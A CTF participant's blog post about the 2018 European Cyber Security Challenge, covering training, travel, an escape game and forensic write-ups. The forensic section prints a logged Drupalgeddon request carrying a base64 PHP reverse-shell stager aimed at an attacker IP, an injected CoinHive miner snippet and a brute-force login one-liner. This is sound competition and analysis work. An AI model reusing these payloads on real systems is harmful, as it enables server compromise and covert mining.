---
weight: 4
title: "Feeback of European CyberSecurity Challenge 2018 final CTF"
date: 2018-11-24T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: "Feedback on the European Cybersecurity Challenge. In 2018 this CTF were organise in London, French team ends the CTF with a second place."
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["ecsc", "anssi", "ctf", "london", "feedback", "maki life", "goodies"]
categories: ["Posts"]

lightgallery: true
---

# Introduction

In this article, I'll share the whole journey that lead me to this event, not just the CTF in itself. It is a totally subjective point of view, so the "jump to section" tool might come in handy if some parts seem useless to you.

First of all, I'll start by catching up on the "Nuit du Hack" event, where it all started for some of the members of the Apéri'Kube, Hexpresso and Inshall'hack teams. Then I'll review our training with the ANSSI before the competition. Finally I'll go over the ANSSI's training platform and the trip to London for the European Cyber Security Challenge.

Have fun ! :)

# Nuit du hack

During the last "Nuit du Hack" (NDH) event, the Apéri'Kube team entered the public Wargame.
During the day, the ANSSI was giving out small plastic cards talking about a national selection for a European CTF taking place in London. This selection was to take place during the NDH's public Wargame.


![](/lib/images/articles/ecsc2018final/anssi1.png)


At that time, I personally made the choice to tuck the card at the bottom of my (full of goodies) bag and to concentrate on the Wargame, with the goal to beat the Hexpresso team :D
Our team ended up finishing second on the final scoreboard!


![](/lib/images/articles/ecsc2018final/scoreboardndh18.png)


After discussing it with the Apéri'Kube team and our friends and relatives, 6 members of the team and I applied for the European Cyber Security Challenge.

A few days later, I was contacted to establish a summary of the Apéri'Kube members that applied. Actually, to enter this CTF, the team needed to be made of :

* 5 members aged 14 to 20
* 5 members aged 21 to 25
* 3 substitutes

In the end, the final list was released on the 6th of July 2018. It was made of : 

* Antoxyde
* Areizen
* Chaign_c
* DrStache
* ENOENT
* Gnomino
* Iptior
* Kara
* Maki
* Nico (@dev2lead)
* Paul (from INSecurity)
* Sideway
* XeR

We were invited the 10th and 11th of September to the ANSSI's headquarters.

# ANSSIminaire

The ANSSI welcomed us on the 10th and 11th of September to prepare for the event, but it was also the opportunity to meet and spend some time with the coaches.

## Day 1 - Getting ready for the event

Upon arrival, we all introduced ourselves. I had already met Antoxyde before, during the Insomni'hack's CTF. We also met the coaches :

* Virtualabs
* Ack
* Heurs

We also met the person in charge of being the link between us, the ANSSI and the ECSC's organizing team.

### Introducing the CTF

After everyone's introduction, the ANSSI introduced us the European Cyber Security Challenge and its history. This event has been organized for 6 year by the ENISA, an agency of the European Union in charge of its network and information security. At the beginning, it was an attack/defense CTF, with only a few countries (5 to 6). In 2017, 10 countries were invited, and 19 in 2018 ! The CTF type changed and became a jeopardy challenge, with additional strategic features.

In the end, 2 of the countries out of 19 couldn't make it, Luxembourg and Scotland. Indeed, to be part of a national team, the members must have the country's nationality and none of theses 2 countries could build up a team in time. Another thing : each country gets to choose its recruitment process, the only conditions set up by the ENISA being the age of the team members, 5 aged 14 to 20 and 5 aged 21 to 25.

The competition takes place during 2 days, between 10am and 6 pm roughly. The first day challenges are not available on the second day and vice-versa, so it is important to prioritize the challenges to complete throughout the day.

Each country represents a cyber security company. The challenges take the form of contracts to execute : for each contract you finish, you earn a certain amount of money and reputation. At that time, we thought that the virtual currency system would be useful to unlock other contracts, exchange information, etc. Moreover, in the challenges' synopsis the coaches received, blockchain was mentioned so we imagined we would deal with a local crypto-currency. In the end, the money was just a name for the points we earned, and the blockchain was used in a forensic challenge. The reputation would have been useful to unlock certain challenges, but in the end it was not used during the competition.

The contracts are in fact a few challenges linked together with a scenario. For example, each first flag of a contract including archive files was the MD5 of the file. Then we would enter the real technical part of the challenge and end it by sending a small report.

There were 3 types of special challenges.
The first one consisted in an oral presentation of 10 minutes in English about one of the first day challenges. We could earn up to 60% of the points of said challenge.
The second one was a 30 minutes escape game. Only 4 members of the team were allowed, including the captain. We didn't know much about it, only that we maybe would have to pick locks. I'll explain it in further details later on.
The last one consisted in a "Boot2root" VM challenge : we had to become root as fast as possible. Those challenges were named "CTF1", "CTF2", etc. It was possible to earn points with the intermediate steps, but when a team would finish one of those, the challenge would disappear from the platform for everyone else.

Finally, the ENISA didn't specify anything concerning bringing a server bay or building a local network. Since we didn't know if we would have an Internet access or not, it was an idea we brought up to the ANSSI. We were later told that we would have an Internet access, so we chose to build a remote infrastructure.


![](/lib/images/articles/ecsc2018final/anssi3.png)


## Day 2 - Level evaluating CTF

On the second day, the ANSSI organized a small CTF. We were divided in 4 teams and spent the day solving challenges together.
On the menu, forensic, crypto, reverse and DFIR challenges. I was in a team with Nico, Antoxyde and Sideway.


![](/lib/images/articles/ecsc2018final/anssi2.png)


### Forensic

Among the challenges I could flag, there were 3 forensic challenges :

- Discovering Bob's password : I just had to use the Mimikatz volatility plugin on the memory dump.
- A 3 challenges set about a malware : the first 2 challenges were about finding the register key and the malware's mutex.
- A LUKS challenge, I forgot what exactly it was about.

As far as I'm concerned, I had a lot of fun solving those challenges, even though I had to re-install my VM right in the middle because of a badass update that broke it all. Pro-tip : after a kernel update, don't forget to reboot your machine to re-activate the drivers, like dm-crypt for cryptsetup...

### DFIR

The Digital Forensic Incident Response (DFIR) challenges were focused on websites that had been pwned. We had to understand how, re-exploit the vulnerability and write a small report that one of the coaches had to validate. Nico did that part.

### Crypto

The only challenge I looked up in that part was the malware one after the two forensic challenges. It used AES, and the vulnerability was in the AES CTR counter.
Antoxyde did the rest, and he did good !

### Others

There were other challenges, for example the reverse ones, Sideway did wonders with them ! It was a good first experience of working together as part of the national team.

At the end of the day, the coaches chose someone to be the team captain... and they chose me. I had mixed up feelings about it, between the "Yay I'm super proud" and the "Why me I'm gonna die".


![](https://media.giphy.com/media/RLi2oeVZiVkE8/giphy.gif)
_My feelings at this moment_


# Online training

Right after the 2 days in Paris, the ANSSI opened up an online training platform, in addition to the Virtualabs and Heurs challenges.

## Platform

The challenges were slightly different, but I worked on the same types : forensic crypto, reverse, web and pwn. It was very interesting, I learned a few useful tricks like the Snappi one (you can find a similar challenge on my platform : https://ctf.maki.bzh).

## Personal

As far as I'm concerned, I went on with my forensic learning and tried to rationalize my actions when facing certain types of files, instead of YOLOing my way through it and breaking my VMs down half of the time.

I built a VM based on the "Tsurugi" Linux distribution (https://tsurugi-linux.org/), which was made by a colleague of mine (Openminded). It includes all the forensic tools, and allowed me to beta test this distribution while learning a bit more about forensic.

I will soon write an other post about the methods I'm using in CTF, with little tips and tricks : stay tuned !

# ECSC Event

After all the preparations, it was time for the event to begin ! It started with a nice and cozy bromance evening at GlaCius' place ❤


![](https://media.giphy.com/media/Q2aN4iiaibCus/giphy.gif)
_Booya_


## Sunday

With ENOENT and DrStache, we took the train from Vannes to Paris to join the rest of the team and board on the Eurostar. But when we arrived at the Gare du Nord, there was a ruckus caused by a bomb alert : what a way to start... After almost missing our train, we were finally on our way towards London.

Upon arrival we headed to the CTF facility to set up our equipment, so that we could arrive the next morning and start right off without losing time.

Afterwards, we went to the hotel : we were on the tenth story of a 4 stars with ENOENT, it was really cool.

At the end of the day, all the countries were invited to watch the teams' introduction videos. In the French one, we were represented by avatars. Big up to the Italians whose video was really funny, and to the Estonians with their Hackerman style.

After the reception, Virtualabs presented us a few hardware, radio frequency and steganography techniques. We set up a CTF pad on my VPS. Which crashed during the night, and since I had set it on my 5000 port, it was blocked by the ECSC network anyway. Hence the lack of CTF platform, sorry guys.

## Monday

In the morning, we had access to a huge buffet : scrambled eggs, sausages, beans... When we finished stuffing our stomachs, we proceeded to register ourselves with the ECSC team. We finished setting up the place, and were on the starting blocks at 10am for the beginning of the CTF.

We tried to organize ourselves according to our specialties : crypto guys next to the reverse guys, next to the forensic guys, etc., so that we could all communicate well. In the end, it didn't really matter but it reassured us : we had a strategy... kind of.

### CTF - Day 1

As we were told, the strategic part with the balance between the money, the reputation and the contracts wasn't a thing anymore. There was only one strategy : __to flag as many things as fast as possible__.

We were told our rank for the Bandstand (escape game) when we arrived, as well as the one for the oral presentation. The teams had to go one after the other, we were scheduled Tuesday at 11h40am for the bandstand and at 3pm for the oral.

After a quick glance, we noticed a lot of forensic challenges with heavy archives. After downloading them, we could see that they were in fact complete memory and disk dumps. For those challenges, there was no particular flag format, we just had to understand how the attacks were done and find the compromission's hints as we studied the archives.

We were in a bit of a rush, so my memory is a bit blurry, but I can remember a fun forensic challenge.

#### Forensics

There were different types of forensic challenges, one was about blockchains for example. We started the contract with a memory dump knowing that a fraudulent transaction had been completed. The first flags were really quite easy :

- Blockchain type
- Incriminated users names
- Finding the smartcontract

This challenge was a fun one, Nico taught me lots of things about blockchains in general. In the end, we had to search for the emails in the memory dump and find the date of the fraudulent transaction. Lucky us, there was only one transaction this day, and we just had to hash it to get the flag.

Other challenges were based on real attacks, like drupalgeddon, packed malwares...
My personal analysis on the forensic challenges : they were much more realistic than other CTFs challenges, it was more like a real incident response in a CERT, not surreal puzzles. However, the lack of flag format really bothered us. Sometimes we would have the answer but since the flag was case-sensitive, it took us some time to enter it the right way.

#### CTF 1 - Fair play you said?

Around 11am, the first Boot2Root, "CTF1", was released. DrStache and Nico got onto it immediately. The entry point was found by DrStache quite quickly, a classical Local File Include (LFI). After dumping the website resources, there was the PHP exec() function with an injectable parameter.
The PHP function was in an "action.php" page, DrStach refreshed the page and... nothing. Error 404. We all try, but we got the same answer, and the Germans just next to us too.
I forwarded the issue to the organizing team, they told me they would reboot the machine. I learned later on thanks to the coaches that it was part of the game.
A few moments later, one team flagged the VM... Not very sporty to cut the entry points...

#### Flag'em all

The day went on, team France kept going. According to other coaches, we were the team that flagged the most during this first day. We ended up 4th, but the 3 first teams and the 2 behind us had already done the Bandstand. This challenge represented a huge amount of points at this moment of the competition.

Just before the end of the day, we decided to start the Bandstand. The first challenge consisted in finding a digicode to unlock the escape game's door. We had to empty a trash bag full of shredded paper to find it.

Results of this first day : we almost finished the platform, with only two little challenges missing.

### Restaurant

We went to the "Giraffe" restaurant in London with all the teams. The mood was quite chill, but it wasn't party time. Most of the teams didn't mix up and stayed together. I ate a good old chicken burger, with a brownie and a scoop of ice cream.

We had some time to sum up the day, and to get ready for the next one.

### Getting ready for the next day

During the evening, we spent some time preparing for the special challenges : the Bandstand and the oral presentation.

#### Bandstand - Finding the code

Back to the hotel, everyone was busy cracking the code (except Nico, Gnomino, XeR and myself as we were preparing for the oral).

Among the shredded papers, there were multiple grids with letters in them (12, including the one with the digicode for the door), letters and a file with many 8 letters words in it (11 were crossed). Analyzing the letters, we could find which word was linked to which grid. The guys then deduced the pin codes. ENOENT noticed that the pin codes were linked to a rotation, for example :

> 12345678
> 23456781
> 34567812 

It was then possible to deduce the pin and password thanks to the Sideway's code :

```python
import hashlib

letters = "PQIOCFTHAXDSWEJMLYRGZ".lower()

# migrated
# https://raw.githubusercontent.com/dwyl/english-words/master/words_alpha.txt
wordlist = open("./words_alpha.txt", "r").read().split("\n")

grid = "1234567890#0987654321"

for w in wordlist:
    if len(w) == 8 and w[-1] == 'd':
        if all([i in letters for i in w]):
#            if len(set(w)) == len(w):
            print(w + " / " + ''.join([grid[letters.index(j)] for j in w]))
```

In the end, the door's code was :

> 630741#

#### Oral presentation

The four of us worked on the oral presentation. Virtualabs took advantage of the day to prepare a template with France's colors. We all agreed that we had to do a more commercial presentation, since each team was supposed to be a cyber security firm.

The challenge we chose was the one with the most points we flagged : the "Examplia Forensics - Linux  \[ENISAForensics1a\]" worth 17,000 points.

##### [Writeup] Examplia Forensics - Linux [ENISAForensics1a]

Before getting to the oral presentation in itself, I'll get over the challenges in this contract. If I remember well, almost everyone on the team worked on it at one point or another. First of all, we began with a zip archive :

* Lmarmedforces.ovf : a VirtualBox virtual machine OVF descriptor
* Lmarmedforces.mf : a manifest file containing the SHA1 hashes of the OVF and VMDK files
* Lmarmedforces-disk1.vmdk : a disk image of the compromised machine
* linux_memory.vmem : a memory dump of the compromised machine

###### A visitor with an Agenda

The first part was about finding the attacker's entry point. The client thought he went through his CMS: Drupal. After a bit of research, we found something interesting in the `acces.log` file :

```bash
$ grep eval /var/log/apache2/access.log
192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] "GET /cfdocs/expeval/displayopenedfile.cfm HTTP/1.1" 404 10134 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000942)"
192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] "GET /cfdocs/expeval/sendmail.cfm HTTP/1.1" 404 10080 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000943)"
192.168.124.169 - - [23/Aug/2018:00:00:59 +0300] "GET /cfdocs/snippets/evaluate.cfm HTTP/1.1" 404 10087 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:001012)"
192.168.124.169 - - [23/Aug/2018:00:02:06 +0300] "GET /contrib/forms/evaluation/C_FormEvaluation.class.php?GLOBALS[fileroot]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 10301 "-" "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:004564)"
192.168.124.171 - - [23/Aug/2018:23:50:56 +0300] "POST /?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzE5Mi4xNjguMTI0LjE3MSc7ICRwb3J0ID0gNDU2NzsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFj.aygiTmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7%29%29%3b&name%5b%23type%5d=markup HTTP/1.1" 200 16100 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
```

The last (POST) request is particularly interesting. It looks like a `Drupalgeddon`.
Still in the log file, we found a file (`s.php`) with a user agent that left no room for imagination :

```bash
$ grep drupalgeddon /var/log/html/access.log
[...]
192.168.124.169 - - [23/Aug/2018:00:11:32 +0300] "POST /s.php HTTP/1.1" 200 166 "-" "drupalgeddon2"
192.168.124.169 - - [23/Aug/2018:00:12:04 +0300] "POST /s.php HTTP/1.1" 200 407 "-" "drupalgeddon2"
192.168.124.169 - - [23/Aug/2018:00:13:55 +0300] "POST /s.php HTTP/1.1" 200 716 "-" "drupalgeddon2"
[...]
```

The first flag was :

> drupalgeddon2

###### Computer slowing down

The client was complaining about his machine slowing down. We thought that a crypto miner could be responsible. The machine was really slow while navigating the internet, it was easier to make a request and analyze it than to go through the entire code.

```bash
$ curl 127.0.0.1 | egrep -i miner
[...]
var miner = new CoinHive.Anonymous("xKfRd1RhnhY5cx71DrmCVJsur6bODn10", {throttle: 0.3});
[...]
```

The flag was :

> xKfRd1RhnhY5cx71DrmCVJsur6bODn10

###### The injection

Now that we had found the malicious JavaScript, we had to determine the PHP function that was responsible for its presence on web pages. After a thorough investigation process, we found :

```bash
$ strings linux_memory.vmem | grep CoinHive
[...]
drupal_add_js('jQuery(document).ready(function () { var miner = new CoinHive.Anonymous("xKfRd1RhnhY5cx71DrmCVJsur6bODn10", {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start();}});','inline');
```

The `drupal_add_js` function spoke for itself, it looked like it was made to inject JS code. We had a good intuition, the flag was :

> drupal_add_js

###### Finding the Miner

The ECSC was kind enough to give us the volatility Linux profile of the memory dump. Given that we were searching for a process, we just had to list them :

```bash
$ volatility -f linux_memory.vmem --profile=Linuxprofile_ecscx86 linux_psaux
[...]
28049 33 33 ./Ocean -B -R 3
[...]
```

By googling the name of the process, we found a Monero miner. No more stupid than another, we decided to dump the process with Antoxyde :

```bash
$ volatility -f linux_memory.vmem --profile=Linuxprofile_ecscx86 linux_procdump -p 28049 -D procdump_out
```

After using another thorough investigation process, we found the wallet address in the binary :

```bash
$ strings -n 20 Ocean.28049.0x8048000`
[...]
new job from %s:%d diff %d
Try "xmrig" --help' for more information.
 built on Jul 30 2018 with GCC
463V7UzhE12Hfbzf4SUnpm4TejddnkhD8RWeJgDJt9RxBphB2BKyDLvBqPv8tDxhZfMc1iTMvMcU3VJAiQq5iAYR2YdYKun
%s: unsupported non-option argument '%s'
No pool URL supplied. Exiting.
[...]
```

The flag was :

> 463V7UzhE12Hfbzf4SUnpm4TejddnkhD8RWeJgDJt9RxBphB2BKyDLvBqPv8tDxhZfMc1iTM

###### The Final Target

Paul had an idea for the challenge. He though about what he would have done if he were the attacker and came up with this question :

> If I have the rights on a website and I want to spread, what can I do ?

The answer was in the question : using Drupal forum. With this idea, he searched for something that would be able to drop a malware or something that looked like it. After a moment, he found the `medical insurance` subject, which included a link with a local address and a strange page.
After searching for the IP address in the log file, we found it and noticed that it indeed had unusual traffic.

The flag was :

> http://192.168.124.171:8080/gR4jPFfOGn

##### Slide show

For the oral presentation, we had 5 minutes with the help of a slide show. With XeR and Nico, we prepared the content while Virtualabs briefed Gnomino on the proper way to behave.

The four of us thought about the questions that could come up and tried to find clear and precise answers. Finally, we rehearsed twice in front of the coaches and were on time (5 minutes !). We were ready !

After a long day (it was already 1 am), it was high time to join ENOENT in the hotel room to get a good night's sleep ❤


![](https://media.giphy.com/media/MhVoc3RYZ8GmQ/giphy.gif)
_Sleeping time_


## Tuesday

Wakey wakey ! A huge English breakfast to be ready for the day, our bags to pack and our teethes to brush : let's head towards the competition's room !

### CTF - Day 2

We arrived a bit early, like yesterday, switched on our machines and waited until 10am to begin the second day of the CTF. Since I knew there would be a hardware challenge this day, I decided to begin with it. I had to keep in mind that XeR, Paul, Chaign_c and I had to do the Bandstand at 11h40 am.

For this hardware challenge, the organizing team gave us all the necessary supplies :

* Arduino nano
* USB <-> UART adaptater
* 4 cables

Since I've already worked on Arduino, I wanted to do a firmware dump with `avrdude`.

To try this, no matter the Arduino model, just push a code that prints on one serial port. Once the Arduino is programmed, plug it to your machine via USB while pushing the RESET button. Then it is possible to get the content of the flash memory thanks to this command :

```bash
$ avrdude -p m328p -c arduino -P /dev/ttyACM0 -b 115200 -U flash:r:flash_raw.bin:r
```

Of course, it didn't work. Indeed, it is impossible to communicate with those ports if the debug fuses are grilled. We would have needed a specific Atmel programmer to get the memory : this is what the Italian team have done.

### Bandstand - "Escape game"

11h40 am : beginning of the Bandstand. We arrived with the code we found the previous day, hoping not to loose time and that the door would opens right away.
And that is what happened ! GG to all of those who worked on it.

#### Room description

We arrived in a little room of about 4m². At first glance, we noticed some interesting things (it was easier if you had entered an Escape Game before) :

* am alarm was ringing 
* a vest was hanging on the wall, right next to the door
* a big toolbox, sealed with 4 digits lockets on each side was resting on a little and high table
* At the bottom of this table, another smaller toolbox, with only one locket (that opened with a key)

#### Challenge 1 & 2

The first challenge was the door code. The second one consisted in deactivating the alarm. Having already entered an Escape Game before, I immediately searched the vest. I found a lock picking kit (it would be useful for the third challenge).

Under the vest, we found the alarm. Under it were written three 4 digits codes. We got to witness XeR's genius for the first time : after looking at it for about 5 seconds he just deactivated the alarm. The codes looked like something like this :

> 2145
> 7577
> 2909

Those aren't the exact codes, I don't remember them. But they were also sequences of numbers.

#### Challenge 3

Second genius episode : thanks to the lock picking kit, XeR unlocked the smaller box. We accessed different things :

* 4 pairs of wire-cutters
* a "blank" sheet
* 2 UV lamps
* 2 electronic connectors
* 1 screwdrivers' box

#### Challenge 4

It was the challenge that took us the longest to achieve. The "blank" sheet wasn't in fact as empty as it seemed. 4 enigmas were written on it with invisible ink, we were able to read them thanks to the UV lamps.

* If a 3 inches cube is painted red, that we cut 1 inch cubes in the big cube and throw them, what is the probability that the upper faces are red ?
* How many letters are there in the missing color to make a rainbow : red, yellow, green, blue, indigo and purple ?
* How many chimneys had the Titanic ?
* In a range from 1 to 1000, which is the least used number ?

First, we split : Chaign_c and I thought about the questions while Paul and XeR tried to bruteforce the code. The missing color was "orange", so the second number was 6. I found that the last number was 0.

With 2 missing numbers, the bruteforce was taking too long. Paul was still thinking : a probability can only be between 0 and 1 ! Given the question, the answer had to be 0.

We bruteforced the last digit : the Titanic had 4 chimneys . The code was :

> 0640

Game was on !

#### Challenge 5

When opening the box, we saw 5 inox plates screwed in a cross shape :


![](/lib/images/articles/ecsc2018final/caisse1.png)


After unscrewing the plates, we found 4 little male connectors numbered from 1 to 4. I got it pretty fast : we had to plug the connectors to the center. Once plugged in, the integrated LEDs started to shine.

In the other compartments (in purple on the picture), there were plenty of different wires with little numbers. The link between the LEDs and the wires' colors and their numbers was obvious. Moreover, in the toolbox we had opened, there were 4 pairs of wire cutters...

So with the 4 of us, 4 compartments, 4 wire cutters, and wires colored given the LED they went with... We had to cut !

At this moment, the game master informed us that normally, a voice was supposed to tell us that the wires had to be cut simultaneously, but it didn't work at the moment.

After a "1, 2, 3, GO", cutting at "GO" to be synchronous, we finished the Bandstand. We solved it all in 19  minutes, making us the fastest group in all of the 6 previous ECSC's editions !

### Back to the CTF

Upon returning to the CTF room, we dropped the news to the team, and resumed with the CTF. They kept going during our absence. As soon as he got to his computer, XeR entered all the Bandstand's flags : we were first again !

#### Hardware challenge

I started working on the hardware challenge again. After my failure with the flash dump, I was asking myself if the UART was on the right pins. I also asked the organizing team to check if I hadn't burned the Arduino card during my tests.

The Arduino was fully functional so I asked if it was possible to change the UART default pins. I was told that they didn't know but it seemed like a good hypothesis. I felt that I was on the right track, so I started to bruteforce the pins to find the transmission one (Tx - Transmitter), waiting for something to pop up on my picocom.
On the D11 pin, I had something ! Something terribly ugly, but something. Non printable characters meant that I was using the wrong baud rate. I used the default baud value for the Arduino (115,200), but after a quick baud bruteforce, I changed it to 38, 400 baud.
The picocom was asking me for a login, hurray ! Now I had to find the reception pin of the card (Rx - Receiver). I did the same thing again, but this time I knew I had the right one when what I wrote showed up on the picocom's prompt. The right pin was the D4.

In the script, it was clearly stated that we had to find both the login and the password. We tried a few classical credentials like : `root:root`, `admin:admin`, `root:toor`... But nothing.

I asked Paul to develop a bruteforcer and he came up with a magnificent one-liner bash :

```bash
$ sleep 1s && cat pass.txt | sed -e 's/^/root\n/g' | while read -r line; do xdotool type "$line" && xdotool key Return && echo "$line" && sleep 1s; done
```

In the end, he ended up trying another credential, and it worked :

> root:admin

So :

```bash
$ sudo picocom -b 38400 /dev/ttyUSB0
[...]
Login: root
Password: admin
Flag
```

#### Other challenges

The whole team kept flagging while we were away, we were second and got the first place thanks to the hardware challenge ! We were overjoyed !

The ANSSI's general director, Guillaume Poupard, paid us a visit to support us and to take a few pictures. When he arrived, we were first, but not from afar. We then went to the second place, and just after he left, first again...

During the day, new "CTF1" and "CTF2" came up, each time we succeeded in finding the entry point but each time another team turned it off, making it impossible for the other teams to keep solving the challenge.

I worked on a forensic challenge : on a pcap, there was a lot of malicious traffic via RDP. We had to find which protocol had been used, which IP addresses were impacted, the attacker's IP address... A lot of guessing for this challenge.

Nico and Gnomino did the oral presentation of the forensic challenge and it seemed to have gone well. We couldn't know for sure until the end of the day.

In the mean time, ENOENT, XeR and Antoxyde finished up the crypto challenges, Sideway did some reverse and stegano with Gnomino, Paul finished a whole forensic contract, DrStache and Nico were on a huge contract about an Active Directory and Chaign_c worked on some pwn, reverse and forensic, where he was needed.

### Final countdown

The last hour : we were first and intended to keep it that way ! Apparently, the Bandstand allowed us to be first, even if we had some minor things left to flag on the platform. We thought we had already won...

But 45 minutes before the end, the "CTF3" came up. The 3 challenges' contract was worth 12,000 points. If one of the 5 first teams finished it, it would be first with no possibilities for the others to get by.

The whole team worked hard on it, we all searched and we found the entry point. DrStache found an injection in the PHP template : when sending `{7*7}`, it answered correctly `49`. We searched a way to inject a command... And at the worst time, the entry point was shut off.
I ran (everybody that really knows me won't believe it), to ask he organizing team to restart the machine.

Finally, the German exulted with joy, they got the first place 20 minutes before the end, only 2,000 points before us.

The CTF was getting to an end, we hoped the oral would lift us to the first place, but the German team chose the same subject and we both had the maximum  number of points. France's team ended up second on this first time entering the challenge, but we were a little bitter because we really thought we had it.


![](http://www.epita.fr/wp-content/uploads/2018/10/retour_European_Cyber_Security_Challenge_2018_londres_equipe_France_ANSSI_hacking_international_Tanguy_EPITA_promo_2022_medaille_argent_02.jpg)


### End of the CTF

There was an end speech, thanking the organizing team, the coaches and the participants of each country. It was finally over and we went to the social event organized on the building's roof.

On the menu, vegetarian burger, 5 different beers with unlimited refill and a lot of exchange with the other teams. It was a really nice event, the Belgians organized a beer contest, we laughed a lot. We talked with the Greeks and the Germans about the CTF and other subjects.

Finally, the party was over. It was time to get back to the hotel to have a last drink before getting to bed and go visit London in the morning.

## Wednesday

We slept in the morning of this last day in London. We got up at 8am, had breakfast and left around 10h30 am to visit Camden Market. For certain members of the team, the event had been "complicated" and some preferred to stay in and rest.

We enjoyed London and the market, it was really chill.


![](/lib/images/articles/ecsc2018final/camdenmarket.jpg)


Lunch time, we were hungry. It started raining so we found a burger restaurant... Vegan. No choice. In the end, it was really good.

Around 3pm, we split in two groups, some of us went back to the hotel to rest before the evening, and some of us went to see Big Ben.
After getting back to my room, I took a shower and we watched a few "Peepoodoo" episodes with ENOENT. Around 5pm we had to move and go to the closing ceremony. It was organized on a boat, it was really nice

When the boat left, we saw the Tower Bridge open just for us, it was really impressive. Then the evening started and we had something to eat, along with two drinks.

Finally, the organizing team began to speak. There was a whole speech on the event in itself, they thanked the sponsors and then ended with the prizes. The podium was :

1. Germany (179,350 pts)
2. France (177,050 pts)
3. United Kingdom (169,950 pts)

The first prize was really interesting, the two others less appealing.

* 1st place : Tickets for any Black Hat for the whole team, and if they choose the EU Black Hat it comes with transportation and sleeping commodities.
* 2nd place : 500 pounds for the whole team.
* 3rd place : 250 pounds for the whole team.


![](https://www.ssi.gouv.fr/uploads/2018/10/20181017_204831-e1539877774547.jpg)


The party kept going on, we laughed and enjoyed this last event. When we went back to the hotel, some of us went to bed, some tried hard on the hack.lu CTF and some others kept partying with the Italians !

I chose to call my girlfriend to kiss her good night before going to bed.

# Conclusion

To sum all this long blog post up, it was a really, really, really awesome adventure. It allowed me to judge the European level, be it our personal or France's team level, but most of all to meet great people, be it the coaches air the other members of our team.

I want to say a huge, huge "thank you" to the member of the ANSSI that allowed us to take part in such an event, he was really nice and supportive.

Regarding the CTF, some aspects need to be upgraded, mostly formatting the flags and banishing the anti-game gameplay. But those are details.
Concerning France, we could see what the event was like, we were like "crash tests" but we ended up doing not so bad. Next year, we will see how the ANSSI organizes the recruitment of the French team and of the coaches. A sure thing : I would gladly go to Romania to represent France !

Hoping to meet everybody again soon, to share a moment and a good beer !

Thank you for reading the whole post, I hope it wasn't too long and that you enjoyed it. If you have questions, whatever it is, I'm on Twitter, LinkedIn, mail, whatever :)

Kisses ❤

# Writeups

Je vais présenter les writeups un peu "en vrac", c'est un peu difficile de savoir quel contrat correspond à quel jour en fonction de qui à fait quoi. Donc les titres vont avoir la forme suivante:

I will do the writeups, but it is a bit messy, it is difficult to remember which contract matches with which day, and to know who did what. So the challenges' tittle will have this format :

> [Nom du chall] - [Catégorie].

## Ma Baker - Reverse

This challenge is composed of two main elements. The first one is the binary (mabaker) and the second is a compressed folder of encrypted docx document. As said in the challenge decryption, we need to find a way to decrypt those files.

### The algorithm

After reading the machine for the whole program we extracted the core algorithm for the key setup. The keys are generated in the following way. The first part is getting the binary pid and using to seed a random number generator.


![](/lib/images/articles/ecsc2018final/mabaker1/img1.png)


